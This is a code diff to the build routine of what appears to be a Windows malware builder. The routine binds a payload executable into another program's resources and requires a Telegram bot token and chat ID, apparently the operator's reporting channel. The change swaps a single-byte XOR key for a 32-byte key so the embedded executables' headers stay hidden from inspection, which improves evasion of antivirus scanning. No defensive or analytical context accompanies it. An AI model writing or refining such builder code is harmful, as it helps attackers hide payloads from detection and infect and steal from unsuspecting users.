@@ -1169,6 +1169,11 @@ static void performBuild() {
     std::string payloadPath = exeDir + "\\payload.exe";
     std::string binderPath = exeDir + "\\binder.exe";
 
+    if (strlen(botTokenBuf) == 0 || strlen(chatIdBuf) == 0) {
+        snprintf(buildStatusMsg, sizeof(buildStatusMsg),
+            "Telegram not configured.\nSet Bot Token + Chat ID in Telegram tab, then Build again.");
+        return;
+    }
     if (!pathFileExists(payloadPath) || !pathFileExists(binderPath)) {
         snprintf(buildStatusMsg, sizeof(buildStatusMsg),
             "Missing payload.exe or binder.exe next to builder:\n%s", exeDir.c_str());
@@ -1251,14 +1256,23 @@ static void performBuild() {
         return;
     }
 
-    // Generate random XOR key
-    BYTE xorKey = (BYTE)(GetTickCount() & 0xFF);
-    if (xorKey == 0) xorKey = 0xA7;
+    // Generate 32-byte XOR key from multiple entropy sources
+    BYTE xorKey[32];
+    DWORD tick = GetTickCount();
+    LARGE_INTEGER perf;
+    QueryPerformanceCounter(&perf);
+    SYSTEMTIME st;
+    GetSystemTime(&st);
+    for (int i = 0; i < 32; i++) {
+        xorKey[i] = (BYTE)((tick >> (i % 24)) ^ (perf.QuadPart >> (i % 56)) ^
+            (st.wMilliseconds * (i + 1)) ^ (0xA7 + i * 7));
+        if (xorKey[i] == 0) xorKey[i] = 0xA7 ^ (i + 1);
+    }
 
-    // XOR-encrypt blobs so embedded PE headers aren't visible in resource section
-    for (size_t i = 0; i < originalData.size(); i++) originalData[i] ^= (char)xorKey;
-    for (size_t i = 0; i < payloadData.size(); i++) payloadData[i] ^= (char)xorKey;
-    for (size_t i = 0; i < configData.size(); i++) configData[i] ^= (char)xorKey;
+    // XOR-encrypt blobs with multi-byte key so embedded PE headers aren't visible
+    for (size_t i = 0; i < originalData.size(); i++) originalData[i] ^= (char)xorKey[i % 32];
+    for (size_t i = 0; i < payloadData.size(); i++) payloadData[i] ^= (char)xorKey[i % 32];
+    for (size_t i = 0; i < configData.size(); i++) configData[i] ^= (char)xorKey[i % 32];
 
     // Open destExe for resource update
     HANDLE hUpdate = BeginUpdateResourceA(destExe.c_str(), FALSE);
@@ -1289,7 +1303,7 @@ static void performBuild() {
     if (!configData.empty()) {
         if (!embedRes(103, configData.data(), (DWORD)configData.size())) resOk = false;
     }
-    if (!embedRes(104, &xorKey, 1)) resOk = false;
+    if (!embedRes(104, xorKey, 32)) resOk = false;
 
     BOOL endOk = EndUpdateResourceA(hUpdate, FALSE);
 
